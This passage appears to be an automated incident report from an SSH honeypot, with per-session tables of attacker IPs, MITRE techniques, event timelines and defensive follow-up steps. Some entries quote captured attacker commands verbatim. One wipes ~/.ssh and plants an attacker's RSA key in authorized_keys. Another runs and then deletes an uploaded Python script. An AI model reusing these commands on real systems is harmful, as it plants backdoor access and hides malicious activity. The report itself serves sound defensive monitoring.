| `2026-08-10 09:53:57` | `cowrie.client.kex` |
| `2026-08-10 09:53:58` | `cowrie.login.success` |
| `2026-08-10 09:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcea9e13ec15

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 09:53 |
| **Last Seen** | 2026-08-10 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:53:57` | `cowrie.session.connect` |
| `2026-08-10 09:53:57` | `cowrie.client.version` |
| `2026-08-10 09:53:57` | `cowrie.client.kex` |
| `2026-08-10 09:53:58` | `cowrie.login.success` |
| `2026-08-10 09:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda69060df7a

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 09:54 |
| **Last Seen** | 2026-08-10 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:54:01` | `cowrie.session.connect` |
| `2026-08-10 09:54:01` | `cowrie.client.version` |
| `2026-08-10 09:54:01` | `cowrie.client.kex` |
| `2026-08-10 09:54:02` | `cowrie.login.success` |
| `2026-08-10 09:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712c9335b45c

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 09:54 |
| **Last Seen** | 2026-08-10 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 09:54:03` | `cowrie.session.connect` |
| `2026-08-10 09:54:03` | `cowrie.client.version` |
| `2026-08-10 09:54:03` | `cowrie.client.kex` |
| `2026-08-10 09:54:04` | `cowrie.login.success` |
| `2026-08-10 09:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0966fd789949

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-10 10:01 |
| **Last Seen** | 2026-08-10 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:01:59` | `cowrie.session.connect` |
| `2026-08-10 10:01:59` | `cowrie.client.version` |
| `2026-08-10 10:01:59` | `cowrie.client.kex` |
| `2026-08-10 10:02:00` | `cowrie.login.success` |
| `2026-08-10 10:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce722d39af0c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-10 10:01 |
| **Last Seen** | 2026-08-10 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:01:59` | `cowrie.session.connect` |
| `2026-08-10 10:01:59` | `cowrie.client.version` |
| `2026-08-10 10:01:59` | `cowrie.client.kex` |
| `2026-08-10 10:02:00` | `cowrie.login.success` |
| `2026-08-10 10:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01b23152ecf2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-10 10:02 |
| **Last Seen** | 2026-08-10 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:02:09` | `cowrie.session.connect` |
| `2026-08-10 10:02:09` | `cowrie.client.version` |
| `2026-08-10 10:02:09` | `cowrie.client.kex` |
| `2026-08-10 10:02:10` | `cowrie.login.success` |
| `2026-08-10 10:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-206590d44b6d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-10 10:02 |
| **Last Seen** | 2026-08-10 10:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:02:10` | `cowrie.session.connect` |
| `2026-08-10 10:02:10` | `cowrie.client.version` |
| `2026-08-10 10:02:10` | `cowrie.client.kex` |
| `2026-08-10 10:02:10` | `cowrie.login.success` |
| `2026-08-10 10:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18295236d34e

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-08-10 10:07 |
| **Last Seen** | 2026-08-10 10:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:07:28` | `cowrie.session.connect` |
| `2026-08-10 10:07:29` | `cowrie.client.version` |
| `2026-08-10 10:07:29` | `cowrie.client.kex` |
| `2026-08-10 10:07:31` | `cowrie.login.success` |
| `2026-08-10 10:07:32` | `cowrie.direct-tcpip.request` |
| `2026-08-10 10:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c753d19a18

| Field | Detail |
|---|---|
| **Source IP** | `45.79.181[.]251` |
| **First Seen** | 2026-08-10 10:25 |
| **Last Seen** | 2026-08-10 10:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:25:11` | `cowrie.session.connect` |
| `2026-08-10 10:25:11` | `cowrie.login.success` |
| `2026-08-10 10:25:11` | `cowrie.session.params` |
| `2026-08-10 10:25:12` | `cowrie.command.input` |
| `2026-08-10 10:25:12` | `cowrie.command.input` |
| `2026-08-10 10:25:12` | `cowrie.command.failed` |
| `2026-08-10 10:25:12` | `cowrie.command.input` |
| `2026-08-10 10:25:12` | `cowrie.command.failed` |
| `2026-08-10 10:25:12` | `cowrie.command.input` |
| `2026-08-10 10:25:12` | `cowrie.log.closed` |
| `2026-08-10 10:25:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.181[.]251` to AbuseIPDB if not already reported
- [ ] Block `45.79.181[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be21198bc726

| Field | Detail |
|---|---|
| **Source IP** | `122.160.59[.]87` |
| **First Seen** | 2026-08-10 10:36 |
| **Last Seen** | 2026-08-10 10:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:36:40` | `cowrie.session.connect` |
| `2026-08-10 10:36:41` | `cowrie.client.version` |
| `2026-08-10 10:36:41` | `cowrie.client.kex` |
| `2026-08-10 10:36:43` | `cowrie.login.success` |
| `2026-08-10 10:36:43` | `cowrie.direct-tcpip.request` |
| `2026-08-10 10:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.59[.]87` to AbuseIPDB if not already reported
- [ ] Block `122.160.59[.]87` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-572e4b23912d

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-08-10 10:36 |
| **Last Seen** | 2026-08-10 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:36:51` | `cowrie.session.connect` |
| `2026-08-10 10:36:51` | `cowrie.client.version` |
| `2026-08-10 10:36:51` | `cowrie.client.kex` |
| `2026-08-10 10:36:52` | `cowrie.login.success` |
| `2026-08-10 10:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a5e9ec825c7

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-08-10 10:36 |
| **Last Seen** | 2026-08-10 10:39 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:36:53` | `cowrie.session.connect` |
| `2026-08-10 10:36:53` | `cowrie.client.version` |
| `2026-08-10 10:36:53` | `cowrie.client.kex` |
| `2026-08-10 10:36:54` | `cowrie.login.success` |
| `2026-08-10 10:36:56` | `cowrie.session.file_upload` |
| `2026-08-10 10:36:57` | `cowrie.session.params` |
| `2026-08-10 10:36:57` | `cowrie.command.input` |
| `2026-08-10 10:36:57` | `cowrie.command.input` |
| `2026-08-10 10:36:57` | `cowrie.command.input` |
| `2026-08-10 10:36:57` | `cowrie.command.failed` |
| `2026-08-10 10:36:57` | `cowrie.log.closed` |
| `2026-08-10 10:36:58` | `cowrie.session.params` |
| `2026-08-10 10:36:58` | `cowrie.command.input` |
| `2026-08-10 10:36:58` | `cowrie.log.closed` |
| `2026-08-10 10:37:00` | `cowrie.session.params` |
| `2026-08-10 10:37:00` | `cowrie.command.input` |
| `2026-08-10 10:37:00` | `cowrie.log.closed` |
| `2026-08-10 10:37:01` | `cowrie.session.params` |
| `2026-08-10 10:37:01` | `cowrie.command.input` |
| `2026-08-10 10:37:01` | `cowrie.command.failed` |
| `2026-08-10 10:37:01` | `cowrie.command.failed` |
| `2026-08-10 10:38:02` | `cowrie.session.params` |
| `2026-08-10 10:38:02` | `cowrie.command.input` |
| `2026-08-10 10:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63c800a144f3

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-08-10 10:36 |
| **Last Seen** | 2026-08-10 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:36:53` | `cowrie.session.connect` |
| `2026-08-10 10:36:53` | `cowrie.client.version` |
| `2026-08-10 10:36:54` | `cowrie.client.kex` |
| `2026-08-10 10:36:54` | `cowrie.login.success` |
| `2026-08-10 10:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e7b5ed8d871

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-08-10 10:39 |
| **Last Seen** | 2026-08-10 10:41 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:39:03` | `cowrie.session.connect` |
| `2026-08-10 10:39:03` | `cowrie.client.version` |
| `2026-08-10 10:39:03` | `cowrie.client.kex` |
| `2026-08-10 10:39:04` | `cowrie.login.success` |
| `2026-08-10 10:39:05` | `cowrie.session.file_upload` |
| `2026-08-10 10:39:06` | `cowrie.session.params` |
| `2026-08-10 10:39:06` | `cowrie.command.input` |
| `2026-08-10 10:39:06` | `cowrie.command.input` |
| `2026-08-10 10:39:06` | `cowrie.command.input` |
| `2026-08-10 10:39:06` | `cowrie.command.failed` |
| `2026-08-10 10:39:07` | `cowrie.log.closed` |
| `2026-08-10 10:39:08` | `cowrie.session.params` |
| `2026-08-10 10:39:08` | `cowrie.command.input` |
| `2026-08-10 10:39:08` | `cowrie.log.closed` |
| `2026-08-10 10:39:09` | `cowrie.session.params` |
| `2026-08-10 10:39:09` | `cowrie.command.input` |
| `2026-08-10 10:39:09` | `cowrie.log.closed` |
| `2026-08-10 10:39:10` | `cowrie.session.params` |
| `2026-08-10 10:39:10` | `cowrie.command.input` |
| `2026-08-10 10:39:10` | `cowrie.command.failed` |
| `2026-08-10 10:39:10` | `cowrie.command.failed` |
| `2026-08-10 10:40:11` | `cowrie.session.params` |
| `2026-08-10 10:40:11` | `cowrie.command.input` |
| `2026-08-10 10:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee19c4d308a

| Field | Detail |
|---|---|
| **Source IP** | `154.83.15[.]101` |
| **First Seen** | 2026-08-10 10:42 |
| **Last Seen** | 2026-08-10 10:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:42:28` | `cowrie.session.connect` |
| `2026-08-10 10:42:28` | `cowrie.client.version` |
| `2026-08-10 10:42:29` | `cowrie.client.kex` |
| `2026-08-10 10:42:30` | `cowrie.login.success` |
| `2026-08-10 10:42:31` | `cowrie.session.params` |
| `2026-08-10 10:42:31` | `cowrie.command.input` |
| `2026-08-10 10:42:31` | `cowrie.command.failed` |
| `2026-08-10 10:42:31` | `cowrie.log.closed` |
| `2026-08-10 10:42:32` | `cowrie.session.params` |
| `2026-08-10 10:42:32` | `cowrie.command.input` |
| `2026-08-10 10:42:32` | `cowrie.session.file_download` |
| `2026-08-10 10:42:32` | `cowrie.log.closed` |
| `2026-08-10 10:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.15[.]101` to AbuseIPDB if not already reported
- [ ] Block `154.83.15[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ec87116b91

| Field | Detail |
|---|---|
| **Source IP** | `154.83.15[.]101` |
| **First Seen** | 2026-08-10 10:42 |
| **Last Seen** | 2026-08-10 10:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:42:32` | `cowrie.session.connect` |
| `2026-08-10 10:42:32` | `cowrie.client.version` |
| `2026-08-10 10:42:32` | `cowrie.client.kex` |
| `2026-08-10 10:42:33` | `cowrie.login.success` |
| `2026-08-10 10:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.15[.]101` to AbuseIPDB if not already reported
- [ ] Block `154.83.15[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b97d6860ed2a

| Field | Detail |
|---|---|
| **Source IP** | `154.83.15[.]101` |
| **First Seen** | 2026-08-10 10:42 |
| **Last Seen** | 2026-08-10 10:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:42:34` | `cowrie.session.connect` |
| `2026-08-10 10:42:34` | `cowrie.client.version` |
| `2026-08-10 10:42:34` | `cowrie.client.kex` |
| `2026-08-10 10:42:35` | `cowrie.login.success` |
| `2026-08-10 10:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.15[.]101` to AbuseIPDB if not already reported
- [ ] Block `154.83.15[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561873e0422b

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-08-10 10:49 |
| **Last Seen** | 2026-08-10 10:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:49:04` | `cowrie.session.connect` |
| `2026-08-10 10:49:04` | `cowrie.client.version` |
| `2026-08-10 10:49:04` | `cowrie.client.kex` |
| `2026-08-10 10:49:05` | `cowrie.login.success` |
| `2026-08-10 10:49:05` | `cowrie.session.params` |
| `2026-08-10 10:49:05` | `cowrie.command.input` |
| `2026-08-10 10:49:06` | `cowrie.command.failed` |
| `2026-08-10 10:49:06` | `cowrie.log.closed` |
| `2026-08-10 10:49:06` | `cowrie.session.params` |
| `2026-08-10 10:49:06` | `cowrie.command.input` |
| `2026-08-10 10:49:06` | `cowrie.session.file_download` |
| `2026-08-10 10:49:06` | `cowrie.log.closed` |
| `2026-08-10 10:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c92d97f804b5

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-08-10 10:49 |
| **Last Seen** | 2026-08-10 10:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:49:07` | `cowrie.session.connect` |
| `2026-08-10 10:49:07` | `cowrie.client.version` |
| `2026-08-10 10:49:07` | `cowrie.client.kex` |
| `2026-08-10 10:49:07` | `cowrie.login.success` |
| `2026-08-10 10:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806fbf4ca6e6

| Field | Detail |
|---|---|
| **Source IP** | `213.176.16[.]218` |
| **First Seen** | 2026-08-10 10:49 |
| **Last Seen** | 2026-08-10 10:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:49:07` | `cowrie.session.connect` |
| `2026-08-10 10:49:07` | `cowrie.client.version` |
| `2026-08-10 10:49:07` | `cowrie.client.kex` |
| `2026-08-10 10:49:08` | `cowrie.login.success` |
| `2026-08-10 10:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.176.16[.]218` to AbuseIPDB if not already reported
- [ ] Block `213.176.16[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3508e967c857

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 10:51 |
| **Last Seen** | 2026-08-10 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:51:09` | `cowrie.session.connect` |
| `2026-08-10 10:51:09` | `cowrie.client.version` |
| `2026-08-10 10:51:09` | `cowrie.client.kex` |
| `2026-08-10 10:51:10` | `cowrie.login.success` |
| `2026-08-10 10:51:10` | `cowrie.direct-tcpip.request` |
| `2026-08-10 10:51:10` | `cowrie.direct-tcpip.data` |
| `2026-08-10 10:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca94d21abec

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-08-10 10:51 |
| **Last Seen** | 2026-08-10 10:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:51:43` | `cowrie.session.connect` |
| `2026-08-10 10:51:44` | `cowrie.client.version` |
| `2026-08-10 10:51:45` | `cowrie.client.kex` |
| `2026-08-10 10:51:47` | `cowrie.login.success` |
| `2026-08-10 10:51:47` | `cowrie.direct-tcpip.request` |
| `2026-08-10 10:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5a41ac97ee

| Field | Detail |
|---|---|
| **Source IP** | `182.156.80[.]11` |
| **First Seen** | 2026-08-10 10:54 |
| **Last Seen** | 2026-08-10 10:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 10:54:51` | `cowrie.session.connect` |
| `2026-08-10 10:54:52` | `cowrie.client.version` |
| `2026-08-10 10:54:52` | `cowrie.client.kex` |
| `2026-08-10 10:54:53` | `cowrie.login.success` |
| `2026-08-10 10:54:54` | `cowrie.direct-tcpip.request` |
| `2026-08-10 10:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `182.156.80[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]142` | **49** | 2026-08-10 08:55 | 2026-08-10 10:54 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **11** | 2026-08-10 09:13 | 2026-08-10 10:48 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.172[.]191` | **5** | 2026-08-10 10:51 | 2026-08-10 10:52 | 0m | 0 | `T1592` | 🟢 LOW |
